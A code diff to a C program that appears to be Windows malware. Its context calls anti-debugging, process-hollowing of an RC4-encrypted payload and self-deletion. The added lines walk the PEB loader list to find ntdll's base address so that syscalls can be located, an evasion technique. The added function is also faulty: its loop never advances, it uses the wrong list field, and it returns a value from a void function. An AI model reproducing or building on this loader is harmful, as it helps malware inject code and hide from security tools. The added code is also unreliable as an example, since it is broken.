@@ -348,6 +348,27 @@ BOOL DeleteSelf() {
 
     return TRUE;
 }
+
+void GetBase(IN PPEB pPEB, OUT PVOID *pBaseAddr) {
+
+    PPEB_LDR_DATA ldr = pPEB->Ldr;
+
+    PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
+
+    PLIST_ENTRY entry = listEntry->Flink;
+
+    while (entry != listEntry) {
+
+        PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+        if (tableEntry->BaseDllName.Buffer && wcscmp(tableEntry->BaseDllName.Buffer, L"ntdll.dll") == 0) {
+            *pBaseAddr = tableEntry->DllBase;
+            break;
+        }
+    }
+    return (PVOID)NULL;
+}
+
 int main() {
 
 
@@ -375,5 +396,20 @@ int main() {
     detectDebug();
     hollowProcess(Pi, sizeof(Rc4CipherText));
     DeleteSelf();
+
+
+
+    PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
+                                                    //Read from GS register at 0x30 offset for TEB
+                                                    //Using TEB we can find PEB
+
+    
+    PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
+
+
+    //Now with the PEB address we can find the base of NTDLL to assist in finding fuynciton syscall instructions
+    //To do this we must navigate through the PEB_LDR_DATA struct which contains all the loaded modules in the process.
+
+
     return 0;
 }
